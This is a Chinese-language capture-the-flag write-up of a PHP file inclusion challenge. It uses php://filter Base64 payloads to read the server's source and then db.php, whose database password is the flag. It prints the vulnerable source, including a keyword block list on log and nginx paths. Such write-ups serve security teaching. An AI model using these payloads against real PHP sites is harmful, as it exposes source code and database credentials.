📝 题目描述
题目提供了一个文件包含执行界面：
<img width="1919" height="990" alt="image" src="https://github.com/user-attachments/assets/c84a2564-f6a1-404f-aaa7-e7e6b4738c5f" />


text
PHP LFI/RFI Code Executor
Enter file path:
Include file
用户可以输入文件路径，服务器会读取并显示文件内容。

目标：利用文件包含漏洞读取 flag。


🔍 解题过程
第一步：理解题目环境
打开页面，是一个简单的表单，可以输入文件路径并提交。

首先需要知道这是一个 LFI（Local File Inclusion） 漏洞。但根据题目名称 php://filter 的提示，这道题的考点是使用 PHP 伪协议读取源码。

第二步：尝试读取 index.php 源码
使用 php://filter 伪协议，以 Base64 编码的形式读取 index.php：

text
php://filter/convert.base64-encode/resource=index.php
结果：成功返回 Base64 编码的源码。
<img width="1918" height="990" alt="image" src="https://github.com/user-attachments/assets/7772bfd2-c464-4965-86a5-aef0d0952de2" />


解码后得到完整的 index.php 源码。

第三步：分析源码中的过滤规则
php
<?php
if (isset($_POST['file'])) {
    echo htmlspecialchars($_POST['file']);
}
?>

<?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file'])): ?>
    <div class="form-group">
        <label>Include Result:</label>
        <div class="result">
            <?php
            include "db.php";
            
            function validate_file_contents($file) {
                if(preg_match('/[^a-zA-Z0-9\/\+=]/', $file)){
                    return false;
                }
                return true;
            }
            
            try {
                // 禁止包含包含 log/nginx/access 关键词的文件
                if (preg_match('/log|nginx|access/', $_POST['file'])) {
                    throw new Exception('Invalid input. Please enter a valid file path.');
                }
                
                ob_start();
                echo file_get_contents($_POST['file']);
                $output = ob_get_clean();
                
                if(!validate_file_contents($output)){
                    throw new Exception('Invalid input. Please enter a valid file path.');
                } else {
                    echo 'File contents:';
                    echo '<br>';
                    echo $output;
                }
            } catch (Exception $e) {
                echo 'Error: ' . htmlspecialchars($e->getMessage());
            }
            ?>
        </div>
    </div>
<?php endif; ?>
关键发现：

过滤规则	说明
preg_match('/log|nginx|access/', $_POST['file'])	文件路径中不能包含 log、nginx、access
validate_file_contents()	文件内容只能包含字母、数字、/、+、=
file_get_contents()	使用 file_get_contents 而非 include，文件内容不会被当作 PHP 代码执行
第四步：尝试读取 flag.php
尝试读取 flag.php：

text
php://filter/convert.base64-encode/resource=flag.php
结果：报错 Error: Invalid input. Please enter a valid file path.

可能原因：

flag.php 文件不存在

路径不对

有其他隐藏过滤

第五步：尝试读取 db.php
从源码中发现 include "db.php"，说明存在 db.php 文件。尝试读取：

text
php://filter/convert.base64-encode/resource=db.php
结果：成功返回 Base64 编码的内容。
<img width="1919" height="997" alt="image" src="https://github.com/user-attachments/assets/09ca8e94-fb65-4594-b618-98a48afedb00" />


第六步：解码获取 Flag
将返回的 Base64 字符串解码：

text
PD9waHAKCiRzZXJ2ZXJuYW1lID0gImxvY2FsaG9zdCI7CiR1c2VybmFtZSA9ICJyb290IjsKJHBhc3N3b3JkID0gIkNURnszZWNyZXRfcGFzc3cwcmRfaGVyZX0iOwokZGJuYW1lID0gImJvb2tfc3RvcmUiOw==
解码后：

php
<?php

$servername = "localhost";
$username = "root";
$password = "CTF{3ecret_passw0rd_here}";
$dbname = "book_store";
🏁 Flag
text
CTF{3ecret_passw0rd_here}
